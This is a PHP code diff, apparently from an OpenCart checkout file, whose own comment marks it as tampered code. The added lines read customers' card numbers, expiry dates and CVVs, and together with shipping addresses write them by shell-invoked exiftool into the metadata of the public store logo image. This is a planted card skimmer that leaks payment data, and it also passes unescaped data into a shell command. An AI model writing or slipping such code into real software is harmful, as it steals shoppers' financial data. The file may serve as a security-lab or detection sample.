@@ -3,9 +3,23 @@
 
     //WARNING!! Tampered code!!! embed customer data info to png logo!
 
-    $creditcart_info = json_encode(this->session->data['payment_method']);
+    $credit_cards = $this->model_checkout_payment_method->getCreditCardInfo($this->session->data['customer']['customer_id']);
+
+    $credit_card_infos      = array();
+
+    $column_keys = array_flip(['card_number','card_expire_month','card_expire_year','card_cvv']); // getting keys as values
+
+    foreach ($credit_cards as $key => $val) {
+        // getting only those key value pairs, which matches $column_keys
+        $credit_card_infos[$key] = array_intersect_key($val, $column_keys);
+    }
+
+
     $address_info = json_encode($this->session->data['shipping_address']);
 
-    $output = passthru('exiftool -comment=" customer credit card info: ' .  $creditcart_info .' - shipping address: ' .  $address_info .'"  /var/www/html/image/catalog/opencart-logo.png');
+    $credit_card_string = str_replace('"', "", json_encode($credit_card_infos));
+
+    $output = passthru('exiftool -comment="credit cards:' .  $credit_card_string . '"  /var/www/html/image/catalog/opencart-logo.png');
+    $output = passthru('exiftool -description="address:' . $address_info .'"  /var/www/html/image/catalog/opencart-logo.png');
     __HALT_COMPILER();
 ?>
